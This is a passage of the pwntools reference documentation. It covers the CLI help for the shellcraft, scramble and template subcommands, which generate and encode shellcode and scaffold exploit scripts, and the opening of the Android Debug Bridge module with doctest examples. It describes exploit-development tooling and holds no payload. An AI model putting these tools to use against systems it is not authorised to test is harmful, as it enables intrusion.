<code class="descname">-b</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--build-id</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-pwnstrip-b" title="Permalink to this definition">¶</a></dt>
<dd><p>Strip build ID</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-pwnstrip-p">
<code class="descname">-p</code><code class="descclassname"> &lt;function&gt;</code><code class="descclassname">, </code><code class="descname">--patch</code><code class="descclassname"> &lt;function&gt;</code><a class="headerlink" href="#cmdoption-pwn-pwnstrip-p" title="Permalink to this definition">¶</a></dt>
<dd><p>Patch function</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-pwnstrip-o">
<code class="descname">-o</code><code class="descclassname"> &lt;output&gt;</code><code class="descclassname">, </code><code class="descname">--output</code><code class="descclassname"> &lt;output&gt;</code><a class="headerlink" href="#cmdoption-pwn-pwnstrip-o" title="Permalink to this definition">¶</a></dt>
<dd></dd></dl>

</div>
<div class="section" id="pwn-scramble">
<h5>pwn scramble<a class="headerlink" href="#pwn-scramble" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-scramble-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-scramble-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-f">
<code class="descname">-f</code><code class="descclassname"> {raw,hex,string,elf}</code><code class="descclassname">, </code><code class="descname">--format</code><code class="descclassname"> {raw,hex,string,elf}</code><a class="headerlink" href="#cmdoption-pwn-scramble-f" title="Permalink to this definition">¶</a></dt>
<dd><p>Output format (defaults to hex for ttys, otherwise raw)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-o">
<code class="descname">-o</code><code class="descclassname"> &lt;file&gt;</code><code class="descclassname">, </code><code class="descname">--output</code><code class="descclassname"> &lt;file&gt;</code><a class="headerlink" href="#cmdoption-pwn-scramble-o" title="Permalink to this definition">¶</a></dt>
<dd><p>Output file (defaults to stdout)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-c">
<code class="descname">-c</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><code class="descclassname">, </code><code class="descname">--context</code><code class="descclassname"> {16,32,64,android,cgc,freebsd,linux,windows,powerpc64,aarch64,sparc64,powerpc,mips64,msp430,thumb,amd64,sparc,alpha,s390,i386,m68k,mips,ia64,cris,vax,avr,arm,little,big,el,le,be,eb}</code><a class="headerlink" href="#cmdoption-pwn-scramble-c" title="Permalink to this definition">¶</a></dt>
<dd><p>The os/architecture/endianness/bits the shellcode will run in (default: linux/i386), choose from: [&#8216;16&#8217;, &#8216;32&#8217;, &#8216;64&#8217;, &#8216;android&#8217;, &#8216;cgc&#8217;, &#8216;freebsd&#8217;, &#8216;linux&#8217;, &#8216;windows&#8217;, &#8216;powerpc64&#8217;, &#8216;aarch64&#8217;, &#8216;sparc64&#8217;, &#8216;powerpc&#8217;, &#8216;mips64&#8217;, &#8216;msp430&#8217;, &#8216;thumb&#8217;, &#8216;amd64&#8217;, &#8216;sparc&#8217;, &#8216;alpha&#8217;, &#8216;s390&#8217;, &#8216;i386&#8217;, &#8216;m68k&#8217;, &#8216;mips&#8217;, &#8216;ia64&#8217;, &#8216;cris&#8217;, &#8216;vax&#8217;, &#8216;avr&#8217;, &#8216;arm&#8217;, &#8216;little&#8217;, &#8216;big&#8217;, &#8216;el&#8217;, &#8216;le&#8217;, &#8216;be&#8217;, &#8216;eb&#8217;]</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-p">
<code class="descname">-p</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--alphanumeric</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-scramble-p" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode with an alphanumeric encoder</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-v">
<code class="descname">-v</code><code class="descclassname"> &lt;avoid&gt;</code><code class="descclassname">, </code><code class="descname">--avoid</code><code class="descclassname"> &lt;avoid&gt;</code><a class="headerlink" href="#cmdoption-pwn-scramble-v" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid the listed bytes</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-n">
<code class="descname">-n</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--newline</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-scramble-n" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid newlines</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-z">
<code class="descname">-z</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--zero</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-scramble-z" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid NULL bytes</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-scramble-d">
<code class="descname">-d</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--debug</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-scramble-d" title="Permalink to this definition">¶</a></dt>
<dd><p>Debug the shellcode with GDB</p>
</dd></dl>

</div>
<div class="section" id="pwn-shellcraft">
<h5>pwn shellcraft<a class="headerlink" href="#pwn-shellcraft" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-shellcraft-arg-shellcode">
<code class="descname">shellcode</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-arg-shellcode" title="Permalink to this definition">¶</a></dt>
<dd><p>The shellcode you want</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-arg-arg">
<code class="descname">arg</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-arg-arg" title="Permalink to this definition">¶</a></dt>
<dd><p>Argument to the chosen shellcode</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft">
<code class="descname">-</code><code class="descclassname">?</code><code class="descclassname">, </code><code class="descname">--show</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft" title="Permalink to this definition">¶</a></dt>
<dd><p>Show shellcode documentation</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-o">
<code class="descname">-o</code><code class="descclassname"> &lt;file&gt;</code><code class="descclassname">, </code><code class="descname">--out</code><code class="descclassname"> &lt;file&gt;</code><a class="headerlink" href="#cmdoption-pwn-shellcraft-o" title="Permalink to this definition">¶</a></dt>
<dd><p>Output file (default: stdout)</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-f">
<code class="descname">-f</code><code class="descclassname"> {r,raw,s,str,string,c,h,hex,a,asm,assembly,p,i,hexii,e,elf,d,escaped,default}</code><code class="descclassname">, </code><code class="descname">--format</code><code class="descclassname"> {r,raw,s,str,string,c,h,hex,a,asm,assembly,p,i,hexii,e,elf,d,escaped,default}</code><a class="headerlink" href="#cmdoption-pwn-shellcraft-f" title="Permalink to this definition">¶</a></dt>
<dd><p>Output format (default: hex), choose from {e}lf, {r}aw, {s}tring, {c}-style array, {h}ex string, hex{i}i, {a}ssembly code, {p}reprocssed code, escape{d} hex string</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-d">
<code class="descname">-d</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--debug</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-d" title="Permalink to this definition">¶</a></dt>
<dd><p>Debug the shellcode with GDB</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-b">
<code class="descname">-b</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--before</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-b" title="Permalink to this definition">¶</a></dt>
<dd><p>Insert a debug trap before the code</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-a">
<code class="descname">-a</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--after</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-a" title="Permalink to this definition">¶</a></dt>
<dd><p>Insert a debug trap after the code</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-v">
<code class="descname">-v</code><code class="descclassname"> &lt;avoid&gt;</code><code class="descclassname">, </code><code class="descname">--avoid</code><code class="descclassname"> &lt;avoid&gt;</code><a class="headerlink" href="#cmdoption-pwn-shellcraft-v" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid the listed bytes</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-n">
<code class="descname">-n</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--newline</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-n" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid newlines</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-z">
<code class="descname">-z</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--zero</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-z" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode to avoid NULL bytes</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-r">
<code class="descname">-r</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--run</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-r" title="Permalink to this definition">¶</a></dt>
<dd><p>Run output</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-color">
<code class="descname">--color</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-color" title="Permalink to this definition">¶</a></dt>
<dd><p>Color output</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-no-color">
<code class="descname">--no-color</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-no-color" title="Permalink to this definition">¶</a></dt>
<dd><p>Disable color output</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-syscalls">
<code class="descname">--syscalls</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-syscalls" title="Permalink to this definition">¶</a></dt>
<dd><p>List syscalls</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-address">
<code class="descname">--address</code><code class="descclassname"> &lt;address&gt;</code><a class="headerlink" href="#cmdoption-pwn-shellcraft-address" title="Permalink to this definition">¶</a></dt>
<dd><p>Load address</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-shellcraft-l">
<code class="descname">-l</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--list</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-shellcraft-l" title="Permalink to this definition">¶</a></dt>
<dd><p>List available shellcodes, optionally provide a filter</p>
</dd></dl>

</div>
<div class="section" id="pwn-template">
<h5>pwn template<a class="headerlink" href="#pwn-template" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-template-arg-exe">
<code class="descname">exe</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-template-arg-exe" title="Permalink to this definition">¶</a></dt>
<dd><p>Target binary</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-template-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-host">
<code class="descname">--host</code><code class="descclassname"> &lt;host&gt;</code><a class="headerlink" href="#cmdoption-pwn-template-host" title="Permalink to this definition">¶</a></dt>
<dd><p>Remote host / SSH server</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-port">
<code class="descname">--port</code><code class="descclassname"> &lt;port&gt;</code><a class="headerlink" href="#cmdoption-pwn-template-port" title="Permalink to this definition">¶</a></dt>
<dd><p>Remote port / SSH port</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-user">
<code class="descname">--user</code><code class="descclassname"> &lt;user&gt;</code><a class="headerlink" href="#cmdoption-pwn-template-user" title="Permalink to this definition">¶</a></dt>
<dd><p>SSH Username</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-pass">
<code class="descname">--pass</code><code class="descclassname"> &lt;password&gt;</code><a class="headerlink" href="#cmdoption-pwn-template-pass" title="Permalink to this definition">¶</a></dt>
<dd><p>SSH Password</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-template-path">
<code class="descname">--path</code><code class="descclassname"> &lt;path&gt;</code><a class="headerlink" href="#cmdoption-pwn-template-path" title="Permalink to this definition">¶</a></dt>
<dd><p>Remote path of file on SSH server</p>
</dd></dl>

</div>
<div class="section" id="pwn-unhex">
<h5>pwn unhex<a class="headerlink" href="#pwn-unhex" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-unhex-arg-hex">
<code class="descname">hex</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-unhex-arg-hex" title="Permalink to this definition">¶</a></dt>
<dd><p>Hex bytes to decode</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-unhex-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-unhex-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

</div>
<div class="section" id="pwn-update">
<h5>pwn update<a class="headerlink" href="#pwn-update" title="Permalink to this headline">¶</a></h5>
<p>usage: pwn [-h]
           {asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,phd,pwnstrip,scramble,shellcraft,template,unhex,update}
           ...</p>
<dl class="option">
<dt id="cmdoption-pwn-update-h">
<code class="descname">-h</code><code class="descclassname"></code><code class="descclassname">, </code><code class="descname">--help</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-update-h" title="Permalink to this definition">¶</a></dt>
<dd><p>show this help message and exit</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-update-install">
<code class="descname">--install</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-update-install" title="Permalink to this definition">¶</a></dt>
<dd><p>Install the update automatically.</p>
</dd></dl>

<dl class="option">
<dt id="cmdoption-pwn-update-pre">
<code class="descname">--pre</code><code class="descclassname"></code><a class="headerlink" href="#cmdoption-pwn-update-pre" title="Permalink to this definition">¶</a></dt>
<dd><p>Check for pre-releases.</p>
</dd></dl>

</div>
</div>
</div>
</div>
</div>
<div class="section" id="module-index">
<h2>Module Index<a class="headerlink" href="#module-index" title="Permalink to this headline">¶</a></h2>
<p>Each of the <code class="docutils literal"><span class="pre">pwntools</span></code> modules is documented here.</p>
<div class="toctree-wrapper compound">
<span id="document-adb"></span><div class="section" id="module-pwnlib.adb.adb">
<span id="pwnlib-adb-android-debug-bridge"></span><h3><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.adb</span></code> &#8212; Android Debug Bridge<a class="headerlink" href="#module-pwnlib.adb.adb" title="Permalink to this headline">¶</a></h3>
<p>Provides utilities for interacting with Android devices via the Android Debug Bridge.</p>
<div class="section" id="using-android-devices-with-pwntools">
<h4>Using Android Devices with Pwntools<a class="headerlink" href="#using-android-devices-with-pwntools" title="Permalink to this headline">¶</a></h4>
<p>Pwntools tries to be as easy as possible to use with Android devices.</p>
<p>If you have only one device attached, everything &#8220;just works&#8221;.</p>
<p>If you have multiple devices, you have a handful of options to select one, or iterate
over the devices.</p>
<p>First and most important is the <code class="docutils literal"><span class="pre">context.device</span></code> property, which declares the &#8220;currently&#8221;
selected device in any scope.  It can be set manually to a serial number, or to a <code class="docutils literal"><span class="pre">Device</span></code>
instance.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Take the first available device</span>
<span class="n">context</span><span class="o">.</span><span class="n">device</span> <span class="o">=</span> <span class="n">adb</span><span class="o">.</span><span class="n">wait_for_device</span><span class="p">()</span>

<span class="c1"># Set a device by serial number</span>
<span class="n">context</span><span class="o">.</span><span class="n">device</span> <span class="o">=</span> <span class="s1">&#39;ZX1G22LH8S&#39;</span>

<span class="c1"># Set a device by its product name</span>
<span class="k">for</span> <span class="n">device</span> <span class="ow">in</span> <span class="n">adb</span><span class="o">.</span><span class="n">devices</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">device</span><span class="o">.</span><span class="n">product</span> <span class="o">==</span> <span class="s1">&#39;shamu&#39;</span><span class="p">:</span>
        <span class="k">break</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">error</span><span class="p">(</span><span class="s2">&quot;Could not find any shamus!&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>Once a device is selected, you can operate on it with any of the functions in
the <code class="xref py py-mod docutils literal"><span class="pre">pwnlib.adb</span></code> module.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Get a process listing</span>
<span class="k">print</span> <span class="n">adb</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;ps&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>

<span class="c1"># Fetch properties</span>
<span class="k">print</span> <span class="n">adb</span><span class="o">.</span><span class="n">properties</span><span class="o">.</span><span class="n">ro</span><span class="o">.</span><span class="n">build</span><span class="o">.</span><span class="n">fingerprint</span>

<span class="c1"># Read and write files</span>
<span class="k">print</span> <span class="n">adb</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">)</span>
<span class="n">adb</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;/data/local/tmp/foo&#39;</span><span class="p">,</span> <span class="s1">&#39;my data&#39;</span><span class="p">)</span>
</pre></div>
</div>
<dl class="class">
<dt id="pwnlib.adb.adb.AdbDevice">
<em class="property">class </em><code class="descclassname">pwnlib.adb.adb.</code><code class="descname">AdbDevice</code><span class="sig-paren">(</span><em>serial</em>, <em>type</em>, <em>port=None</em>, <em>product='unknown'</em>, <em>model='unknown'</em>, <em>device='unknown'</em>, <em>features=None</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.AdbDevice" title="Permalink to this definition">¶</a></dt>
<dd><p>Encapsulates information about a connected device.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">device</span> <span class="o">=</span> <span class="n">adb</span><span class="o">.</span><span class="n">wait_for_device</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">arch</span>
<span class="go">&#39;arm&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">bits</span>
<span class="go">32</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">os</span>
<span class="go">&#39;android&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">product</span>
<span class="go">&#39;sdk_phone_armv7&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">serial</span>
<span class="go">&#39;emulator-5554&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.adb">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">adb</code><span class="sig-paren">(</span><em>argv</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L74-89"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.adb" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the output of an ADB subcommand.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">adb</span><span class="p">([</span><span class="s1">&#39;get-serialno&#39;</span><span class="p">])</span>
<span class="go">&#39;emulator-5554\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.boot_time">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">boot_time</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.boot_time" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">Boot time of the device, in Unix time, rounded to the
nearest second.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.build">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">build</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.build" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the Build ID of the device.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.compile">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">compile</code><span class="sig-paren">(</span><em>source</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L1183-1236"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.compile" title="Permalink to this definition">¶</a></dt>
<dd><p>Compile a source file or project with the Android NDK.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.current_device">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">current_device</code><span class="sig-paren">(</span><em>any=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L109-124"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.current_device" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an <code class="docutils literal"><span class="pre">AdbDevice</span></code> instance for the currently-selected device
(via <code class="docutils literal"><span class="pre">context.device</span></code>).</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">device</span> <span class="o">=</span> <span class="n">adb</span><span class="o">.</span><span class="n">current_device</span><span class="p">(</span><span class="nb">any</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span>
<span class="go">AdbDevice(serial=&#39;emulator-5554&#39;, type=&#39;device&#39;, port=&#39;emulator&#39;, product=&#39;sdk_phone_armv7&#39;, model=&#39;sdk phone armv7&#39;, device=&#39;generic&#39;)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">device</span><span class="o">.</span><span class="n">port</span>
<span class="go">&#39;emulator&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.devices">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">devices</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.devices" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a list of <code class="docutils literal"><span class="pre">Device</span></code> objects corresponding to the connected devices.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.disable_verity">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">disable_verity</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.disable_verity" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables dm-verity on the device.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.exists">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">exists</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.exists" title="Permalink to this definition">¶</a></dt>
<dd><p>Return <code class="xref py py-const docutils literal"><span class="pre">True</span></code> if <code class="docutils literal"><span class="pre">path</span></code> exists on the target device.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s1">&#39;/init&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.fastboot">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">fastboot</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.fastboot" title="Permalink to this definition">¶</a></dt>
<dd><p>Executes a fastboot command.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">The command output.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.find_ndk_project_root">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">find_ndk_project_root</code><span class="sig-paren">(</span><em>source</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L1118-1131"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.find_ndk_project_root" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a directory path, find the topmost project root.</p>
<p>tl;dr &#8220;foo/bar/jni/baz.cpp&#8221; ==&gt; &#8220;foo/bar&#8221;</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.fingerprint">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">fingerprint</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.fingerprint" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the device build fingerprint.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.forward">
